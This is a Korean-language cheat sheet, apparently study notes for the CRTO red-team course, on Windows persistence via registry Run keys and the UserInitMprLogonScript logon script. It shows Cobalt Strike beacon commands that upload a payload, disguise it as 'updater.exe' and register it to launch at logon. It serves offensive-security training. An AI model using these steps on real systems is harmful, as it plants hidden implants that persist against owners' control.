# CRTO CheatSheet

<p align="center">
<img width="300" height="300" alt="crto-review-01" src="https://github.com/user-attachments/assets/276f2305-1e5b-4802-b346-bebfb436c820" />
<p>
  
- [Persistence](#persistence)
  - [Boot & Logon Autostart Execution](#boot--logon-autostart-execution)
  - [Logon Script](#logon-script)


## Persistence

### Boot & Logon Autostart Execution
---

[Boot or Logon Autostart Execution is a collection of techniques - T1547](https://attack.mitre.org/techniques/T1547/)

T1547(Boot or Logon Autostart Execution)는 시스템 부팅 또는 로그인 시 프로그램을 자동으로 실행하도록 시스템 설정을 구성하여 시스템에 대한 지속성을 유지하거나 손상된 시스템에서 더 높은 수준의 권한을 획득할 수 있다. 

#### 레지스트리 실행 키

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

`Run` 키는 시스템을 재부팅하여도 계속 유지가 되는 반면 `RunOnce` 키는 처음 실행 후 자동으로 삭제된다. 


#### `reg_set` 명령어 구문
`reg_set <host:optional> <hive> <key> <value> <type> <data>. `


``` shell
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps

beacon> upload C:\Payloads\http_x64.exe

beacon> mv http_x64.exe updater.exe

​

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe

Setting registry key \\.\0000000080000001\Software\Microsoft\Windows\CurrentVersion\Run\Updater with type 1

Successfully set regkey

SUCCESS.
```

`reg_query`를 통해서 생성된 레지스트리 키를 확인한다. 

``` shell
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater

  01/07/2025 11:51:52 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    Updater                REG_EXPAND_SZ          %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
```

> `reg_delete`를 사용해 더이상 쓰지 않는 레지스트리 키를 제거한다. 



### Logon Script
---

[Logon Script (Windows) - T1037.001](https://attack.mitre.org/techniques/T1037/001/)

T1037.001(Boot or Logon Initialization Scripts: Logon Script (Windows))는 T1037 하위 기술로써, `HKCU\Environment\UserInitMprLogonScript` 레지스터 키를 사용해 Windows에서 특정 사용자 또는 사용자 그룹이 시스템에 로그인할 때마다 로그인 스크립트가 실행되도록하여 지속적인 접근 권한을 확보할 수 있다. 

``` shell
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe

Setting registry key \\.\0000000080000001\Environment\UserInitMprLogonScript with type 2
Successfully set regkey
SUCCESS.
```
